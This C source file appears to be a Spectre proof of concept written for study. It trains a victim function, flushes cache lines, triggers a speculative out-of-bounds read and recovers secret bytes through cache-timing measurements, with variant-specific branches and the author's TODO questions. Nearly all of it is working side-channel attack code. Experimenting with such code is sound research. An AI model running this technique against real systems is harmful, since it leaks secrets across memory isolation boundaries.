#include "spectre_helper.h"
#include "fnr_helper.h"
#include <stdint.h>
#include <stdio.h>

uint8_t array[256 * 4096];
uint8_t temp = 0;
int bufferSize = 16;
int bufferSizeMask = 0x0f;

// TODO
// If we declare buffer size as 16 instead of 160, it works, but with lower resolution
// WHY?
uint8_t buffer[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
// TODO
// If the secret is short, like below, Spectre won't work! WHY?
// char secret[] = "It's the secret.";
// unreachable but known address
char secret[] = "The Magic Words are Squeamish Ossifrage.";


/**
 * Finds cached entry of the array
 * Iterates over 256 entries to find latencies smaller than threshold
 */
void find_cached_index(int* scores){

	uint64_t time_dif;
	for (int i = 0; i < 256; i++)
	{
		time_dif = 0;
		measure_time(time_dif, &array[i * 4096]);

		if(time_dif < CACHE_HIT_THRESHOLD){
			scores[i]++;
		}
	}
}


/**
 * Finds highest score in the scores array
 */
void find_highest_score(int* scores){
	int maxScore = 0;
	int maxIndex = 0;
	for (int i = 1; i < 256; i++)
	{
		if(scores[i] > maxScore){
			maxIndex = i;
			maxScore = scores[i];
		}
	}
	printf("Letter: %c\t Index: %d\t number of hits:%d\n", maxIndex, maxIndex, maxScore);
}


/**
 * Train the victim function
 */
void train_victim(){
	#ifdef __SPECTRE__V7
	size_t* x;
	#endif
	for (int i = 0; i < 20; i++){
		
		#ifdef __SPECTRE__V7
		x = victim_function(0);
		#else
		victim_function(i % 10);
		#endif
		
		clflush_array(array);
		clflush(&bufferSize);
		#ifdef __SPECTRE__v6
		clflush(&bufferSizeMask); // used for v6
		#endif
		#ifdef __SPECTRE__V7
		clflush(x);
		#endif
	}
	asm volatile("lfence\n");
	clflush_array(array);
	clflush(&bufferSize);
	
	#ifdef __SPECTRE__v6
	clflush(&bufferSizeMask); // used for v6
	#endif
		
	#ifdef __SPECTRE__V7
	clflush(x);
	#endif
}

/**
 * Reads one byte from the out of bounds of the buffer
 * Spectre v2
 */
void steal_byte(int* scores, int larger_x){
	
	// do the experiment 1000 Times
	for(int it = 0; it < 1000; it++){
		train_victim();	
		// access to the array speculatively	
		victim_function(larger_x);
	
		find_cached_index(scores);
	}
	find_highest_score(scores);
}